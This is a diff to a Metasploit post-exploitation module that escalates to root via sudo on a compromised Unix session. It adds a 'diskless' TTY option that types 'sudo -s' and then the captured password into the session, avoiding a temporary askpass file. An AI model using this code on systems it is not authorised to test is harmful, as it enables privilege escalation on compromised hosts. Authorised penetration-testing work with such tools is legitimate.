@@ -22,9 +22,10 @@ class MetasploitModule < Msf::Post
         'Author'        =>
           [
             'todb <todb[at]metasploit.com>',
-            'Ryan Baxendale <rbaxendale[at]gmail.com>' #added password option
+            'Ryan Baxendale <rbaxendale[at]gmail.com>', #added password option
+            'rageltman <rageltman[at]sempervictus>' #added TTY option
           ],
-        'Platform'      => %w{ aix linux osx solaris unix },
+        'Platform'      => %w{ aix linux osx solaris unix bsd},
         'References'    =>
           [
             # Askpass first added March 2, 2008, looks like
@@ -35,6 +36,7 @@ class MetasploitModule < Msf::Post
 
       register_options(
         [
+          OptBool.new('DISKLESS_TTY', [false, 'Echo password to sudo -s instead of tmpfile', true]),
           OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])
         ])
   end
@@ -95,6 +97,15 @@ class MetasploitModule < Msf::Post
       rescue
         print_error "SUDO: Passwordless sudo failed. Check the session log."
       end
+    elsif datastore['DISKLESS_TTY']
+      if cmd_exec("tty").empty?
+        print_error("Diskless sudo passwd entry needs a TTY")
+        return
+      end
+      vprint_good("Running 'sudo -s'")
+      session.shell_command("sudo -s", 2)
+      vprint_good("Sending password")
+      session.shell_command(datastore['PASSWORD'], 2)
     else
       askpass_sh = "/tmp/." + Rex::Text.rand_text_alpha(7)
       begin
